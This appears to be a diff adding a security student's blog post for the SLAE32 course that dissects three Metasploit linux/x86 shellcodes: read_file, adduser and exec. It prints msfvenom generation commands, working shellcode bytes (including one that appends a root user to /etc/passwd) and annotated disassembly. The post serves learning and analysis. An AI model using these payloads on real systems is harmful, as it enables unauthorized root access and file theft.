@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.82.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Andrea Perfetti">
+<meta name="keywords" content="Assembly, Metasploit, Analysis">
+<meta name="description" content="The fifth assigment for the SLAE32 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86 and dissect them presenting the analysis.">
+
+
+<meta property="og:description" content="The fifth assigment for the SLAE32 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86 and dissect them presenting the analysis.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SLAE32 - Assignment 5 - Analysis">
+<meta name="twitter:title" content="SLAE32 - Assignment 5 - Analysis">
+<meta property="og:url" content="https://andrea-perfetti.github.io/2021/03/slae32-assignment-5-analysis/">
+<meta property="twitter:url" content="https://andrea-perfetti.github.io/2021/03/slae32-assignment-5-analysis/">
+<meta property="og:site_name" content="Andrea Perfetti">
+<meta property="og:description" content="The fifth assigment for the SLAE32 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86 and dissect them presenting the analysis.">
+<meta name="twitter:description" content="The fifth assigment for the SLAE32 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86 and dissect them presenting the analysis.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2021-03-14T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-03-14T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="SLAE Exam Assignments">
+    
+      <meta property="article:section" content="SLAE 32-bit">
+    
+  
+  
+    
+      <meta property="article:tag" content="SLAE32">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://andrea-perfetti.github.io/img/slae/0_slae32_badge.png">
+  <meta property="twitter:image" content="https://andrea-perfetti.github.io/img/slae/0_slae32_badge.png">
+
+
+
+
+
+  <meta property="og:image" content="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg">
+  <meta property="twitter:image" content="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg">
+
+
+    <title>SLAE32 - Assignment 5 - Analysis</title>
+
+    <link rel="icon" href="https://andrea-perfetti.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-5-analysis/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://andrea-perfetti.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="2">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://andrea-perfetti.github.io/">Andrea Perfetti</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://andrea-perfetti.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="2">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://andrea-perfetti.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Andrea Perfetti</h4>
+        
+          <h5 class="sidebar-profile-bio">YHQL, YLGL, YLFL.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/about/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/andrea-perfetti" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="2"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      SLAE32 - Assignment 5 - Analysis
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-03-14T00:00:00Z">
+        
+  
+  
+  
+  
+    2021-03-14
+  
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://andrea-perfetti.github.io/categories/slae-exam-assignments">SLAE Exam Assignments</a>, 
+    
+      <a class="category-link" href="https://andrea-perfetti.github.io/categories/slae-32-bit">SLAE 32-bit</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>The fifth assigment for the SLAE32 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86 and dissect them presenting the analysis.</p>
+<p>The list of available shellcodes have been generated using the following command:</p>
+<pre><code>msfvenom --list payloads | grep linux/x86
+</code></pre><h2 id="readfile">ReadFile</h2>
+<p>The first shellcode I have selected is <code>linux/x86/read_file</code>.</p>
+<p>First of all, we need to understand which parameters this shellcode needs:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.1-ReadFile]
+└─$ msfvenom -p linux/x86/read_file -a x86 --platform linux --list-options                           
+Options for payload/linux/x86/read_file:
+=========================
+
+
+       Name: Linux Read File
+     Module: payload/linux/x86/read_file
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 62
+       Rank: Normal
+
+Provided by:
+    hal
+
+Basic options:
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+FD    1                yes       The file descriptor to write output to
+PATH                   yes       The file path to read
+
+Description:
+  Read up to 4096 bytes from the local file system and write it back 
+  out to the specified file descriptor
+</code></pre><p>I opted for <code>/tmp/flag.txt</code> as file to be read, therefore the shellcode generation is done with the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.1-ReadFile]
+└─$ msfvenom -p linux/x86/read_file -a x86 --platform linux -f c -o readfile.txt PATH=&quot;/tmp/flag.txt&quot;
+No encoder specified, outputting raw payload
+Payload size: 75 bytes
+Final size of c file: 339 bytes
+Saved as: readfile.txt
+</code></pre><p>I have then taken the shellcode and passed it to ndisasm:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.1-ReadFile]
+└─$ echo -ne &quot;\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x00&quot; | ndisasm -u - &gt; readfile_disasm.txt
+</code></pre><p>This shellcode is a classic JMP-CALL-POP example: this technique is used to get memory address for string &ldquo;/tmp/flag.txt\00&rdquo; (shellcode starting at offset 0x3D).</p>
+<p>After the JMP-CALL, several syscalls are being executed.</p>
+<p>The first is a call to <a href="https://man7.org/linux/man-pages/man2/open.2.html">__NR_open</a> (Syscall 0x5, value in EAX) popping the pointer to the string (file to be opened) into EBX and setting ECX (int flags) to zero.</p>
+<pre><code>00000002  B805000000        mov eax,0x5
+00000007  5B                pop ebx
+00000008  31C9              xor ecx,ecx
+0000000A  CD80              int 0x80
+</code></pre><p>After execution, the file descriptor for the opened file is into EAX, and it is then moved to EBX in order to perform a <a href="https://man7.org/linux/man-pages/man2/read.2.html">__NR_read</a> operation (Syscall 0x3, value in EAX). The address of the top of the stack (ESP) is used as <em>*buf</em> parameter and it is therefore copied into EDI and then into ECX. EDX is set to 4096 - 0x1000 in hex - as <em>count</em> parameter (number of bytes to be read)</p>
+<pre><code>0000000C  89C3              mov ebx,eax
+0000000E  B803000000        mov eax,0x3
+00000013  89E7              mov edi,esp
+00000015  89F9              mov ecx,edi
+00000017  BA00100000        mov edx,0x1000
+0000001C  CD80              int 0x80
+</code></pre><p>The return value of the syscall, stored in EAX after its execution, is the number of bytes read, which is then moved to EDX in order to perform a <a href="https://man7.org/linux/man-pages/man2/write.2.html">__NR_write</a> operation (Syscall 0xd, value in EAX).
+EBX contains the first parameter - <em>fd</em> - which is set to 1 (STDOUT); ECX already contains parameter <em><em>buf</em></em> from the previous syscall and EDX - copied from eax right after the <em>read</em> syscall - contains the number of bytes read.</p>
+<pre><code>0000001E  89C2              mov edx,eax
+00000020  B804000000        mov eax,0x4
+00000025  BB01000000        mov ebx,0x1
+0000002A  CD80              int 0x80
+</code></pre><p>The final action is the execution of an <code>exit(0)</code> function.</p>
+<pre><code>0000002C  B801000000        mov eax,0x1
+00000031  BB00000000        mov ebx,0x0
+00000036  CD80              int 0x80
+</code></pre><h2 id="adduser">AddUser</h2>
+<p>The second shellcode I have selected is <code>linux/x86/adduser</code>.</p>
+<p>First of all, we need to understand which parameters this shellcode needs:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.2-AddUser]
+└─$ msfvenom -p linux/x86/adduser -a x86 --platform linux --list-options  
+Options for payload/linux/x86/adduser:
+=========================
+
+
+       Name: Linux Add User
+     Module: payload/linux/x86/adduser
+   Platform: Linux
+       Arch: x86
+Needs Admin: Yes
+ Total size: 97
+       Rank: Normal
+
+Provided by:
+    skape &lt;mmiller@hick.org&gt;
+    vlad902 &lt;vlad902@gmail.com&gt;
+    spoonm &lt;spoonm@no$email.com&gt;
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+PASS   metasploit       yes       The password for this user
+SHELL  /bin/sh          no        The shell for this user
+USER   metasploit       yes       The username to create
+
+Description:
+  Create a new user with UID 0
+</code></pre><p>We are good to go with the default options, therefore the shellcode generation is done with the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.2-AddUser]
+└─$ msfvenom -p linux/x86/adduser -a x86 --platform linux -f c -o adduser.txt
+No encoder specified, outputting raw payload
+Payload size: 97 bytes
+Final size of c file: 433 bytes
+Saved as: adduser.txt
+</code></pre><p>I have then taken the shellcode and passed it to ndisasm:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.2-AddUser]
+└─$ echo -ne &quot;\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&quot; | ndisasm -u - &gt; adduser_disasm.txt
+</code></pre><p>At offset 0x26 we can see a call to 0x53, the instructions between the two addresses seems to be very obscure but with a quick check it is clear that at offset 0x2B we can find a string related to the user we want to create. In order to correctly disassemble the last piece, I have taken all the shellcode from 0x53 to the end and ran a second disasm, for which the output is available in <code>adduser_disasm_lastpiece.txt</code>.</p>
+<p>Now the shellcode is quite clear: it performs 4 syscalls in order to add the new user at the end of /etc/passwd:
+<img src="https://andrea-perfetti.github.io/img/slae/slae5-adduser-01.png" alt="AddUser shellcode flow"></p>
+<p>The first call is to <a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">setreuid</a>, which sets real and effective user IDs of the calling process. Input parameters are set to zero, meaning an impersonation of user &lsquo;root&rsquo; (which is required in order to edit /etc/passwd file).
+<img src="https://andrea-perfetti.github.io/img/slae/slae5-adduser-02.png" alt="AddUser shellcode analysis - part 1"></p>
+<p>The second call is to <a href="https://man7.org/linux/man-pages/man2/open.2.html">open</a>, its purpose is to get a file descriptor to write into <code>/etc/passwd</code>. Address of the file is pushed on the stack, and 0x401 (OCT 2001) is set as file flags, meaning <code>O_WRONLY</code> (Write-only) and <code>O_APPEND</code> (new lines will be added at the end of the file).
+<img src="https://andrea-perfetti.github.io/img/slae/slae5-adduser-03.png" alt="AddUser shellcode analysis - part 2"></p>
+<p>The result of the call is the file descriptor, which is put into EAX. The third call is a <a href="https://man7.org/linux/man-pages/man2/write.2.html">write</a> to add the new user into /etc/passwd. The pointer to the string to be added is obtained with a call (offset 0x26).
+<img src="https://andrea-perfetti.github.io/img/slae/slae5-adduser-04.png" alt="AddUser shellcode analysis - part 3"></p>
+<p>The last call is to <a href="https://man7.org/linux/man-pages/man2/exit.2.html">exit</a>. EBX (the exit status) is not really changed, therefore the exit status will be the file descriptor used in previous calls.
+<img src="https://andrea-perfetti.github.io/img/slae/slae5-adduser-05.png" alt="AddUser shellcode analysis - part 4"></p>
+<h2 id="exec">Exec</h2>
+<p>The third shellcode I have selected is <code>linux/x86/exec</code>.</p>
+<p>First of all, we need to understand which parameters this shellcode needs:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.3-Exec]
+└─$ msfvenom -p linux/x86/exec -a x86 --platform linux --list-options                        
+Options for payload/linux/x86/exec:
+=========================
+
+
+       Name: Linux Execute Command
+     Module: payload/linux/x86/exec
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 36
+       Rank: Normal
+
+Provided by:
+    vlad902 &lt;vlad902@gmail.com&gt;
+
+Basic options:
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+CMD                    yes       The command string to execute
+
+Description:
+  Execute an arbitrary command
+</code></pre><p>I opted for <code>/usr/bin/whoami</code> as file to be read, therefore the shellcode generation is done with the following command:</p>
+<pre><code>┌──(kali㉿kali)-[~/SLAE32-Exam/5.3-Exec]
+└─$ msfvenom -p linux/x86/exec -a x86 --platform linux -f c -o exec.txt CMD=&quot;/usr/bin/whoami&quot;
+No encoder specified, outputting raw payload
+Payload size: 51 bytes
+Final size of c file: 240 bytes
+Saved as: exec.txt
+</code></pre><p>I have then taken the shellcode and passed it to ndisasm with the same method used for the two shellcodes already described.</p>
+<p>The code is nothing but executing an <a href="https://man7.org/linux/man-pages/man2/execve.2.html">__NR_execve</a> syscall with appropriate parameters.
+The pointer to the string of command to be executed (whoami) is gathered through the <em>call</em> at offset 0x18, therefore the disasm from there on is not the real picture of the executed instructions. In order to disassemble the last piece, I have taken all the shellcode from 0x2d to the end and ran a second disasm, for which the output is available in <code>exec_disasm_lastpiece.txt</code></p>
+<p>In the following image, you can find a scheme of the shellcode flow, with the situation of the stack at the interrupt for the syscall.
+<img src="https://andrea-perfetti.github.io/img/slae/slae5-exec-flow.png" alt="Exec shellcode flow"></p>
+<!-- raw HTML omitted -->
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>.</p>
+<p><strong>Student ID</strong>: <code>SLAE - 1547</code><br>
+<strong>GitHub repository</strong>: <a href="https://github.com/andrea-perfetti/SLAE32-Exam">https://github.com/andrea-perfetti/SLAE32-Exam</a></p>
+<p>This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ uname -a 
+Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
+</code></pre>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://andrea-perfetti.github.io/tags/slae32/">SLAE32</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav style="visibility: hidden">
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-2-tcp-reverse-shell/" data-tooltip="SLAE32 - Assignment 2 - TCP Reverse Shell">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-7-crypter/" data-tooltip="SLAE32 - Assignment 7 - Crypter">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Andrea Perfetti. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+        <div class="post-actions-wrap">
+  
+      <nav style="visibility: hidden">
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-2-tcp-reverse-shell/" data-tooltip="SLAE32 - Assignment 2 - TCP Reverse Shell">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-7-crypter/" data-tooltip="SLAE32 - Assignment 7 - Crypter">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Andrea Perfetti</h4>
+    
+      <div id="about-card-bio">YHQL, YLGL, YLFL.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        IT Security Specialist
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Italy
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://andrea-perfetti.github.io/img/wallpa/pexels-elijah-o%27donnell-3473569.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://andrea-perfetti.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
